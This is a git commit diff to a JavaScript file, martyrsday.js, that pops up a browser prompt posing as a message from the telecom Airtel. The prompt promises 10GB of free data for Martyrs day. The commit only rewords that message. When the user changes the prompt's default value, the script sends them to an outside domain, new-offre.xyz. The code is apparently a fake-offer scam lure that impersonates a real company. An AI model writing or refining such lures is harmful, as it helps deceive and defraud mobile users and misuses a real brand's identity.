a8614b48f643163359f0d38da75349c6d8986e02
bigetijazz10 <bigetijazz10@gmail.com>
2024-10-31 01:35:07 -0700

    Update martyrsday.js

--- martyrsday.js
+++ martyrsday.js
@@ -1,6 +1,6 @@
 
 var password = 'ACTIVATE 10GB'
-password=prompt('Airtel: Congratulations, Your Number is Eligible to receive ACTIVATE 10GB0GB free data to celebrate Martyrs day, Kindly press Ok to ACTIVATE','ACTIVATE 10GB');
+password=prompt('Airtel: Hello! Check if Your Number is Eligible to receive 10GB free data to celebrate Martyrs day, Kindly press Ok to proceed','ACTIVATE 10GB');
 if (password != 'ACTIVATE 10GB') {
 location.href='https://www.new-offre.xyz/10gb-bonus';
 }
